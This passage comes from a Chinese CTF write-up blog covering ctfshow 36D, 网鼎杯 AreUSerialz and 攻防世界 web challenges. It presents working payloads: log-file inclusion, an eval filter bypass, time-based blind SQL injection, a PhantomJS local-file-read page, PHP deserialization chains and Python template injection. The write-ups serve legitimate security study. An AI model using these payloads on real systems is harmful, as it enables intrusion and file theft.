baby challenge right?</span><br></pre></td></tr></table></figure>

<p>访问<code>all_info_u_want.php?all_info_i_want=1</code>得到phpinfo页面<br>还有一个文件包含，这里尝试使用日志包含，先访问<code>/all_info_u_want.php?all_info_i_want=1&amp;file=../../..//var/log/nginx/access.log</code>成功显示日志信息，说明有戏。抓包修改</p>
<p><img src="/2020/05/11/ctfshow36d/1588296881365.png" alt="1588296881365"></p>
<p>包含成功，蚁剑连接，根目录下放了一个假的flag。。。提示在/etc里面<br>根据修改的时间最终在/etc/opt/secret/下发现flag。</p>
<h2 id="WEB-给你shell"><a href="#WEB-给你shell" class="headerlink" title="WEB_给你shell"></a>WEB_给你shell</h2><p>F12发现<code>?view_source</code>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'view_source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">':'</span>, $s);</span><br><span class="line">    <span class="keyword">if</span> ($arr[<span class="number">0</span>] === <span class="string">'&#123;"secret"'</span> &amp;&amp; preg_match(<span class="string">'/^[\"0-9A-Z]*&#125;$/'</span>, $arr[<span class="number">1</span>]) &amp;&amp; count($arr) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !theFirstTimeSetCookie() ) setcookie(<span class="string">'secret'</span>, <span class="string">''</span>, time()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span><span class="params">($_f_g)</span> </span>&#123;</span><br><span class="line">    $_g_r = <span class="number">32</span>;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, <span class="number">1</span>);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">'secret'</span>]) ? $json = $_COOKIE[<span class="string">'secret'</span>] : setcookie(<span class="string">'secret'</span>, <span class="string">'&#123;"secret":"'</span> . strtoupper(md5(<span class="string">'y1ng'</span>)) . <span class="string">'"&#125;'</span>, time()+<span class="number">7200</span> );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, <span class="keyword">true</span>) : <span class="keyword">die</span>(<span class="string">'no'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($obj &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'give_me_shell'</span>])) &#123;</span><br><span class="line">    ($obj[<span class="string">'secret'</span>] != $flag_md5 ) ? haveFun($flag) : <span class="keyword">echo</span> <span class="string">"here is your webshell: $shell_path"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure>

<p>先本地测试各个函数的作用<br>checkCookie<br><code>explode</code>将传入的参数变为数组，然后检查格式，其格式只能为<code>{&quot;secret&quot;:&quot;770F0F8B605CFD2BA494849D948D34EF&quot;}</code><br><img src="/2020/05/11/ctfshow36d/1588392187492.png" alt="1588392187492"></p>
<p>haveFun<br>该函数的作用是将传入的参数进行一次md5加密，之后转换为大写。再将每一个字符截取出来，如果是字母便转换为64，是数字就转换为0，最后拼接输出，但是好像并没有什么用<br><img src="/2020/05/11/ctfshow36d/1588396772261.png" alt="1588396772261"></p>
<p>这里使用的是三目运算符<br>代码逻辑如下：</p>
<blockquote>
<ul>
<li>有个名为secret的cookie，存的是json</li>
<li>使用<code>checkCookie()</code>函数检查cookie，确保格式</li>
<li>如果secret对应值和<code>$flag_md5</code>相等则给出shell，不等则调用<code>haveFun()</code>函数</li>
</ul>
</blockquote>
<p>这里使用burp爆破一下，发现secret值为115的时候相等</p>
<p><img src="/2020/05/11/ctfshow36d/1588812352191.png" alt="1588812352191"></p>
<p>官方wp：</p>
<blockquote>
<p><img src="/2020/05/11/ctfshow36d/1588812545032.png" alt="1588812545032"></p>
</blockquote>
<p>访问webshell,cookie改为{“secret”:115}，传入give_me_shell=1得到下一个页面源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//there are some secret waf that you will never know, fuzz me if you can</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"hidden_filter.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">'login'</span>])</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;script&gt;location.href=\'./index.php\'&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        <span class="comment">//清空session 从头再来</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"\$_SESSION["</span> . $code . <span class="string">"]=false;"</span>); <span class="comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When you feel that you are lost, do not give up, fight and move on.</span></span><br><span class="line"><span class="comment"> * Being a hacker is not easy, it requires effort and sacrifice.</span></span><br><span class="line"><span class="comment"> * But remember … we are legion!</span></span><br><span class="line"><span class="comment"> *  ————Deep CTF 2020</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>测试后发现过滤了很多字符，但是没有过滤取反<br>payload</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?code=]=<span class="number">1</span>?&gt;&lt;?=<span class="keyword">require</span>~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>首先用]=1闭合SESSION</li>
<li>分号作为PHP语句的结尾，起到表示语句结尾和语句间分隔的作用，而对于php的单行模式是不需要分号的，因此用<code>?&gt;&lt;?</code>来bypass分号</li>
<li>没有括号 使用那些不需要括号的函数 这里使用<code>require</code></li>
<li>没有引号表示不能自己传参数，这里使用取反运算</li>
<li>由于PHP黑魔法 <code>require</code>和取反运算符之间不需要空格照样执行</li>
</ul>
<p>读取flag.txt<br><img src="/2020/05/11/ctfshow36d/1588818706809.png" alt="1588818706809"></p>
<p>然后取反/flag包含一下flag就出来了：<br><img src="/2020/05/11/ctfshow36d/1588819090242.png" alt="1588819090242"></p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?code=]=<span class="number">1</span>?&gt;&lt;?=<span class="keyword">require</span>~%d0%99%93%9e%98?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/11/ctfshow36d/1588818722627.png" alt="1588818722627"></p>
<h2 id="WEB-Login-Only-For-36D"><a href="#WEB-Login-Only-For-36D" class="headerlink" title="WEB_Login_Only_For_36D"></a>WEB_Login_Only_For_36D</h2><p>此题为一个登陆框，右键源码发现两个提示</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- if (!preg_match('/admin/', $uname)) die; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- select * from 36d_user where username='$uname' and password='$passwd'; --&gt;</span></span><br></pre></td></tr></table></figure>

<p>抓包发现过滤了<code>&#39;</code>、<code>=</code>、<code>and</code>、、、<br>ascii，mid，substr也过滤了，只能使用left<br>payload：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="keyword">if</span>(length(password)<span class="comment">/**/</span>like<span class="comment">/**/</span><span class="number">15</span>,sleep(<span class="number">10</span>),<span class="number">1</span>)%<span class="number">23</span>		#判断密码长度</span><br><span class="line"><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="keyword">if</span>((left(password,<span class="number">11</span>)<span class="comment">/**/</span>like<span class="comment">/**/</span><span class="string">"ilovethlrt"</span>),sleep(<span class="number">10</span>),<span class="number">1</span>)%<span class="number">23</span>	#获取密码</span><br></pre></td></tr></table></figure>

<p>这里我使用的burp爆破，脚本后面再写<br>得到密码为<code>ilovethlrtysixd</code>，这里我犯了一个错误，like是模糊查询，不区分大小写。这里要使用 <code>LIKE BINARY</code><br>payload:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">username=<span class="keyword">admin</span>\&amp;<span class="keyword">password</span>=<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="keyword">if</span>((left(<span class="keyword">password</span>,<span class="number">1</span>)<span class="comment">/**/</span><span class="keyword">LIKE</span><span class="comment">/**/</span>BINARY<span class="comment">/**/</span>"a"),sleep(<span class="number">5</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/11/ctfshow36d/1588425465683.png" alt="1588425465683"></p>
<p>最后得到admin:ILoVeThlrtySixD登录得到flag</p>
<h2 id="WEB-RemoteImageDownloader"><a href="#WEB-RemoteImageDownloader" class="headerlink" title="WEB_RemoteImageDownloader"></a>WEB_RemoteImageDownloader</h2><p>打开题目为一个输入框，其会将输入的网址返回截图<br><img src="/2020/05/11/ctfshow36d/1588746623875.png" alt="1588746623875"></p>
<p>大佬wp中推荐了一篇文章<br><a href="https://www.anquanke.com/post/id/86371" target="_blank" rel="noopener">从PhantomJS图片渲染中的XSS漏洞到SSRF/本地文件读取漏洞</a><br><a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/" target="_blank" rel="noopener">Breaching the perimeter - PhantomJs Arbitrary file read</a></p>
<p>过程为<br>在自己的云服务器上写一个html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="actionscript"> x=<span class="keyword">new</span> XMLHttpRequest; </span></span><br><span class="line"><span class="actionscript"> x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText) </span></span><br><span class="line"> &#125;; </span><br><span class="line"><span class="actionscript"> x.open(<span class="string">"GET"</span>,<span class="string">"file:///flag"</span>); </span></span><br><span class="line"> x.send(); </span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/11/ctfshow36d/1588751013546.png" alt="1588751013546"></p>
<p>访问该html，图片 返回的即是读取的内容<br><img src="/2020/05/11/ctfshow36d/1588751062284.png" alt="1588751062284"></p>
<h1 id="网鼎杯2020-AreUSerialz"><a href="#网鼎杯2020-AreUSerialz" class="headerlink" title="[网鼎杯2020]AreUSerialz"></a>[网鼎杯2020]AreUSerialz</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>is_valid函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化之前会做逐字判断，ascii必须&gt;=32或&lt;=125<br>但是这里会ban掉不可见字符\00，这个在序列化protected属性的对象时会出现，我们需要绕过它，php7.1+版本对属性类型不敏感，所以本地序列化就直接用public就可以绕过了<br>我们可以序列化构造$op=”2”和$filename=”flag.php”，调用read()函数读取flag.php，但是在进行read()之前就会调用__destruct()魔术方法，如果$this-&gt;op === “2”就会设置$this-&gt;op为”1″，而”1″在process()函数中会调用write()函数，不能读取文件。但是process()函数中使用了不严格相等if($this-&gt;op == “2”),这里弱类型可以通过int来绕过我们可以构造<code>$op=2</code>来绕过，也可以使用2e0绕过<br>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $op=<span class="number">2</span>;	<span class="comment">//这里直接构造整型i</span></span><br><span class="line">	<span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;</span><br><span class="line">	<span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> FileHandler;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<blockquote>
<p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;N;}</p>
</blockquote>
<p>之后通过str传入即可<br><img src="/2020/05/11/ctfshow36d/1589163598885.png" alt="1589163598885"></p>
<p>也可以使用伪协议读取，BUU上复现时题目将flag路径改为了/var/www/html，省去了找路径这一步<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $op=<span class="string">'2e0'</span>;</span><br><span class="line">	<span class="keyword">public</span> $filename=<span class="string">'php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php'</span>;</span><br><span class="line">	<span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> FileHandler;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/11/ctfshow36d/1589164551600.png" alt="1589164551600"></p>
<p>参考文章：<a href="https://clq0.top/2020/05/%e7%bd%91%e9%bc%8e%e6%9d%af2020-web-writeup/" target="_blank" rel="noopener">https://clq0.top/2020/05/%e7%bd%91%e9%bc%8e%e6%9d%af2020-web-writeup/</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF刷题1</title>
    <url>/2020/04/19/CTFstudy/</url>
    <content><![CDATA[<p>CTF刷题记录</p>
<p><strong>红包9</strong><br>ssrf攻击mysql</p>
<a id="more"></a>

<h1 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h1><h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p><img src="/2020/04/19/CTFstudy/1.png" alt><br>先扫描目录，看是否有源码泄露<br><img src="/2020/04/19/CTFstudy/2.png" alt><br>在index.phps里面发现源码泄露，但是不全，查看源码发现完整源码<br><img src="/2020/04/19/CTFstudy/3.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>

<p>如果id=admin,那么就直接退出。又要经过<code>$_GET[id] = urldecode($_GET[id]);</code>，使得<code>$_GET[id] == &quot;admin&quot;</code>，所以可以将进行两次url编码，因为使用urldecode解码后，浏览器再解一便满足admin=id<br>即</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="built_in">?id</span>=<span class="meta">%2561</span><span class="meta">%2564</span><span class="meta">%256d</span><span class="meta">%2569</span><span class="meta">%256e</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/CTFstudy/4.png" alt></p>
<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<p>开局给了这几行代码<br>我们先将其序列化输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line">$a=<span class="keyword">new</span> xctf();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"xctf"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"flag"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/CTFstudy/5.png" alt></p>
<p>使用code传参后发现不对。</p>
<p>wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数。<br>所以我们可以修改对象的个数进行绕过</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"xctf"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"flag"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>这样便得出了flag</p>
<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>文件上传<br>有前端验证，直接上传一张图片，抓包修改后缀就可以了<br><img src="/2020/04/19/CTFstudy/6.png" alt></p>
<h2 id="python-template-injection"><a href="#python-template-injection" class="headerlink" title="python_template_injection"></a>python_template_injection</h2><p>这个是python模板注入<br>先测试一下<br><img src="/2020/04/19/CTFstudy/7.png" alt><br>先查看有哪些文件</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;&#123;''.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__['os'].listdir(<span class="name">'.'</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>读取内容</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'fl4g'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/CTFstudy/8.png" alt></p>
<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p>题目代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); 